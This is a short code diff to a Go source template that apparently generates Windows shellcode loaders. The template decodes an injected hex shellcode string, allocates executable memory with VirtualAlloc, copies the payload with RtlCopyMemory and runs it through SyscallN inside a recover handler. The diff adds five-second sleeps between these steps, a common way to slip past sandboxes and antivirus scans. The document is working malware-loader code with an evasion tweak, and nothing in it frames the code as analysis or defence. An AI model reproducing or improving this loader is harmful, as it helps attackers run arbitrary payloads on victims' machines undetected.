@@ -14,6 +14,7 @@ package main
 
 import (
 	"encoding/hex"
+	"time"
 	"syscall"
 	"unsafe"
 )
@@ -21,11 +22,15 @@ import (
 func main() {
 	defer func() {
 		if err := recover(); err != nil {
+			time.Sleep(5 * time.Second)
 			shellCode, _ := hex.DecodeString("` + s + `")
 			VirtualAlloc := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc")
 			RtlCopyMemory := syscall.MustLoadDLL("ntdll.dll").MustFindProc("RtlCopyMemory")
+			time.Sleep(5 * time.Second)
 			addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellCode)), 0x1000|0x2000, 0x40)
+			time.Sleep(5 * time.Second)
 			_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellCode[0])), uintptr(len(shellCode)))
+			time.Sleep(5 * time.Second)
 			syscall.SyscallN(addr, 0, 0, 0, 0)
 		}
 	}()
